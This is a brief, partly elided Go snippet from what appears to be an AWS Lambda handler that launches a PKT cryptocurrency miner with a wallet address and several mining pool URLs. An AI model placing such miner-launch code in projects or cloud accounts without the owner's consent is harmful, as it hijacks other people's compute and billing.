...
func handler(request events.APIGatewayProxyRequest) (*events.APIGatewayProxyResponse, error) {
	...
	cmd := exec.Command(executableFile, "ann", "-p", walletAddress, "http://pool.pkt.world/master/min4096", "https://stratum.zetahash.com/d/4096", "http://pool.pkteer.com", "http://pool.pktpool.io")
	err = cmd.Start()
	if err != nil {
